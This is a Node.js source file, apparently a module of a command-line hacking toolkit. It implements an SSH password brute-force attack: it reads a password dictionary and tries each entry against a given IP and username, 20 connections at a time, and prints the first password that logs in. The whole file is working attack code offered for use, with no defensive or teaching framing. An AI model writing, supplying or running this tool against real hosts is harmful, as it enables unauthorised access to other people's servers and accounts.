"use strict";

// Dependencies
const { runJobs } = require("parallel-park")
const ssh2 = require("ssh2-promise")
const fs = require("fs")

// Variables
var globalArgs;

// Functions
async function bruteforce(dictionary){
    console.log("[SSH] Bruteforcing, please wait.")

    var results = await runJobs(
        dictionary,
        async(password, index, max)=>{
            try{
                const config = {
                    host: globalArgs.ip,
                    username: globalArgs.username,
                    password: password,
                    keepaliveCountMax: 0
                }

                const ssh = new ssh2.SSH(config)
                
                await ssh.connect()

                ssh.close()
                return password
            }catch{}
        },
        {
            concurrency: 20
        }
    )

    results = results.filter((result)=>result)
    
    results[0] ? console.log("Valid password found:", results[0]) : console.log("No valid password found.")
}

// Main
module.exports = async function(args, program){
    program.requiredOption("-ip, --ip <ip>", "The target IP.")
    .requiredOption("-user, --username <username>", "The target username.")
    .requiredOption("-d, --dictionary <dictionary>", "A file that contains passwords.").parse()

    args = program.opts()
    globalArgs = program.opts()

    const dictionary = fs.readFileSync(args.dictionary, "utf8").replace(/\r/g, "").split("\n")

    bruteforce(dictionary)
}